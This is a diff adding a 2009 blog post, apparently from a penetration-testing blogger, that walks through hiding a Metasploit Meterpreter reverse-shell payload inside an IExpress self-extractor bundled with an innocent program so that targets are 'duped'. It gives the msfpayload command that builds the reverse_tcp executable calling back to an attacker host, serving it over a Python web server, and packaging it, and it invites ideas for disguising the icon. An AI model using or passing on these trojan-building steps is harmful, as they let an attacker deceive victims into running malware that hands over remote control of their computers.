@@ -1,0 +1,36 @@
+---
+author: mubix
+comments: true
+date: 2009-03-02 19:24:23+00:00
+layout: post
+title: Metasploit heart's Microsoft
+categories:
+- iexpress
+- metasploit
+---
+
+<iframe src="//player.vimeo.com/video/3440084" width="500" height="361" frameborder="0" webkitallowfullscreen mozallowfullscreen allowfullscreen></iframe> <p><a href="http://vimeo.com/3440084">Hiding Meterpreter with IExpress</a> from <a href="http://vimeo.com/mubix">mubix</a> on <a href="https://vimeo.com">Vimeo</a>.</p>
+  
+Using the IExpress, a built in tool (XP, not sure about other Windows versions), we package two executables together, so that the target is less likely to suspect foul play. Now, I used calc.exe, but you can use anything on both sides of the coin. Use a better game so that it's easyier to dupe, or a different malicious executable (leekspin perhaps?).  
+  
+I'll let your minds take this to the level I know you all are capable of. One caveat is that the icon for the executable is that of the self extractor, which shouldn't be that much of an issue to change, but I don't know off the top of my head of an app that does it, so please comment and let me know if you do.  
+  
+Commands from video:  
+
+* `./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.0.100 LPORT=1080 X > /tmp/academy/bob.exe`
+* (For python 2.4+) python -m SimpleHTTPServer
+* (For python 2.3 -) python -c "from SimpleHTTPServer import test; test()"
+* Start -> Run -> iexpress <return>
+* Run multi/hander from command line (not shown in video)
+  
+  
+Links from video:  
+
+  * [http://www.metasploit.com/](http://www.metasploit.com/)
+  * [http://www.shell-fu.org/](http://www.shell-fu.org/)
+  * [http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true](http://www.microsoft.com/technet/prodtechnol/ie/ieak/techinfo/deploy/60/en/iexpress.mspx?mfr=true)
+  * [http://www.virustotal.com/](http://www.virustotal.com/)
+  * [http://www.theacademypro.com/](http://www.theacademypro.com/)
+  * [http://www.theacademyhome.com/](http://www.theacademyhome.com/)
+  
+
